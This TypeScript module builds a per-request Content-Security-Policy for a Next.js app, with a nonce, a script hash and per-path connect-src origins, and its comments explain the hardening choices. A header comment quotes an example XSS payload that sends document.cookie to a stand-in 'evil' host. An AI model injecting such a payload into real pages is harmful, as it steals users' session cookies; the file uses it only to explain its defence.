import { THEME_BOOTSTRAP_SCRIPT } from '@/lib/theme-bootstrap';

/**
 * Content-Security-Policy for every HTML document this app serves.
 *
 * ─────────────────────────────────────────────────────────────────────────────
 * WHY THE POLICY IS BUILT PER REQUEST INSTEAD OF BEING A STATIC HEADER
 * ─────────────────────────────────────────────────────────────────────────────
 * `script-src` used to contain 'unsafe-inline'. That single keyword made the
 * rest of the policy close to decorative: an HTML-injection bug anywhere (a
 * translated string, a blog post body, an email subject echoed into a page)
 * could ship `<img onerror=...>` or `<script>fetch('https://evil/'+document.cookie)</script>`
 * and the browser would run it. CSP is the second line of defence behind output
 * encoding, and with 'unsafe-inline' present there was no second line.
 *
 * It could not simply be deleted, because Next.js App Router streams its own
 * inline `<script>self.__next_f.push(...)</script>` blocks on every response —
 * that is how the RSC payload reaches the client. Block those and nothing
 * hydrates. The framework's answer is a per-request nonce, so the policy has to
 * be generated per request, which is why it is assembled here and emitted from
 * proxy.ts rather than being a constant in next.config.js / vercel.json.
 *
 * ─────────────────────────────────────────────────────────────────────────────
 * WHAT IS ALLOWED TO RUN, AND WHY
 * ─────────────────────────────────────────────────────────────────────────────
 *  'self'            — /_next/static/** chunks, /_vercel/insights/script.js
 *                      and /_vercel/speed-insights/script.js (Vercel Analytics
 *                      and Speed Insights inject those from a useEffect with
 *                      document.createElement, so they are same-origin src
 *                      loads, not inline scripts, and need no nonce).
 *  'nonce-<random>'  — Next's inline bootstrap + RSC flight scripts. Next reads
 *                      the nonce back out of the CSP on the REQUEST (see
 *                      proxy.ts) and stamps it onto the tags it emits. No app
 *                      code has to do anything.
 *  'sha256-<theme>'  — the one inline script we author ourselves (see
 *                      src/lib/theme-bootstrap.ts). A hash rather than the
 *                      nonce, for two reasons: (1) app/global-error.js is
 *                      prerendered to static HTML at build time, when no
 *                      per-request nonce exists, and it renders the same
 *                      script; (2) handing the nonce to the root layout would
 *                      mean calling headers() there, which opts EVERY route in
 *                      the app into dynamic rendering forever.
 *  js.stripe.com     — kept from the previous policy. Nothing loads Stripe.js
 *                      today (checkout is a server-side redirect to Stripe's
 *                      hosted page), but the allowlist is harmless and Elements
 *                      has been on and off the roadmap.
 *  va.vercel-scripts.com — @vercel/analytics and @vercel/speed-insights load
 *                      their DEBUG builds from there in development; in
 *                      production the scripts are same-origin.
 *
 * A nonce and a hash coexist happily: a script runs if it matches ANY source
 * expression. Note that the presence of either one makes browsers IGNORE
 * 'unsafe-inline', so adding it back would be a no-op — the only way to weaken
 * this policy by accident is to delete the nonce.
 *
 * ─────────────────────────────────────────────────────────────────────────────
 * WHAT IS DELIBERATELY *NOT* LOCKED DOWN
 * ─────────────────────────────────────────────────────────────────────────────
 *  style-src 'unsafe-inline' — stays. There are ~1,100 `style={{...}}` props
 *      across app/ and components/ (407 in components/dashboard/Pages.jsx
 *      alone). React renders those as inline `style` ATTRIBUTES, and CSP has no
 *      nonce mechanism for attributes at all — the only alternative is
 *      'unsafe-hashes' plus a separate hash per distinct attribute value, which
 *      is unmaintainable for values computed at render time. Removing it means
 *      moving every dynamic style to a CSS variable or class. CSS injection is
 *      also a materially smaller problem than script injection: it cannot
 *      execute code, and the classic exfiltration tricks (attribute selectors +
 *      background-image) are already blocked by our tight `img-src`/`connect-src`.
 *      This is a conscious accepted risk, not an oversight.
 *
 *  'strict-dynamic' — not used. It would make browsers IGNORE 'self' and the
 *      host allowlists, so Stripe and the analytics script would then depend on
 *      being injected by an already-trusted script. That is a behavioural
 *      change we cannot verify without a production deploy, and the marginal
 *      gain over a nonce is small for an app that serves no third-party JS.
 *
 *  form-action — absent, as before. Worth adding, but it is a different change
 *      with a different blast radius (Stripe/OAuth flows post across origins).
 */

/**
 * 128 bits of randomness, base64. Long enough that an attacker who can inject
 * markup but cannot read the response body has no chance of guessing it, which
 * is the entire security property a nonce provides.
 *
 * The format matters: Next.js only recognises a nonce matching
 * /^'nonce-([A-Za-z0-9+/_-]+={0,2})'$/ (see
 * next/dist/server/app-render/get-script-nonce-from-header.js). Standard base64
 * of 16 bytes is 22 characters plus "==", which fits.
 */
export function generateNonce(): string {
  const bytes = crypto.getRandomValues(new Uint8Array(16));
  let binary = '';
  for (const byte of bytes) binary += String.fromCharCode(byte);
  return btoa(binary);
}

/**
 * SHA-256 of the theme bootstrap script, formatted as a CSP source expression.
 *
 * Computed from the shared constant rather than hard-coded, so editing the
 * script cannot desynchronise the markup from the policy. Web Crypto's digest
 * is async and this runs on every request, so the promise is memoised at module
 * scope — after the first request in an isolate it resolves immediately.
 */
let themeScriptHashPromise: Promise<string> | null = null;

function themeScriptHash(): Promise<string> {
  themeScriptHashPromise ??= (async () => {
    const digest = await crypto.subtle.digest(
      'SHA-256',
      new TextEncoder().encode(THEME_BOOTSTRAP_SCRIPT),
    );
    let binary = '';
    for (const byte of new Uint8Array(digest)) binary += String.fromCharCode(byte);
    return `'sha256-${btoa(binary)}'`;
  })();
  return themeScriptHashPromise;
}

/**
 * Builds the full policy for one request.
 *
 * IMPORTANT — directive ORDER is load-bearing. Next.js finds the nonce by
 * taking the first directive whose text `startsWith('script-src')`. If a
 * `script-src-elem` or `script-src-attr` directive is ever added, it must come
 * AFTER `script-src`, or Next will read the nonce out of the wrong directive
 * (or find none) and every inline framework script will be blocked.
 */
/**
 * Pages whose own code calls a third-party origin from the browser, and the
 * origins each may call. Scoped per path so the rest of the site keeps the
 * tight base `connect-src`.
 *
 * /tools/email-settings-lookup (any locale prefix) resolves MX records over
 * Cloudflare DNS-over-HTTPS and reads Mozilla's ISPDB. Both answer with
 * Access-Control-Allow-Origin: *.
 */
const EXTRA_CONNECT_SRC: Array<{ path: RegExp; origins: string[] }> = [
  {
    path: /^(?:\/[a-z]{2})?\/tools\/email-settings-lookup\/?$/,
    origins: ['https://cloudflare-dns.com', 'https://autoconfig.thunderbird.net'],
  },
];

/** The extra connect-src origins `pathname` is allowed, or none. */
export function extraConnectSrc(pathname: string | undefined): string[] {
  if (!pathname) return [];
  return EXTRA_CONNECT_SRC.filter((entry) => entry.path.test(pathname)).flatMap((entry) => entry.origins);
}

export async function buildContentSecurityPolicy(nonce: string, pathname?: string): Promise<string> {
  const isProduction = process.env.NODE_ENV === 'production';

  const scriptSrc = [
    "'self'",
    `'nonce-${nonce}'`,
    await themeScriptHash(),
    // React's development build reconstructs call stacks with eval, and
    // Turbopack's HMR client evaluates module code the same way. Both are
    // absent from the production bundle, so this never ships to users.
    ...(isProduction ? [] : ["'unsafe-eval'"]),
    'https://js.stripe.com',
    'https://va.vercel-scripts.com',
  ];

  return [
    "default-src 'self'",
    `script-src ${scriptSrc.join(' ')}`,
    "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
    "img-src 'self' data: blob: https://*.supabase.co https://lh3.googleusercontent.com https://avatars.githubusercontent.com",
    ["connect-src 'self' https://*.supabase.co wss://*.supabase.co https://api.stripe.com", ...extraConnectSrc(pathname)].join(' '),
    "font-src 'self' https://fonts.gstatic.com",
    'frame-src https://js.stripe.com https://hooks.stripe.com',
    "frame-ancestors 'none'",
    "object-src 'none'",
    "base-uri 'self'",
  ].join('; ') + ';';
}
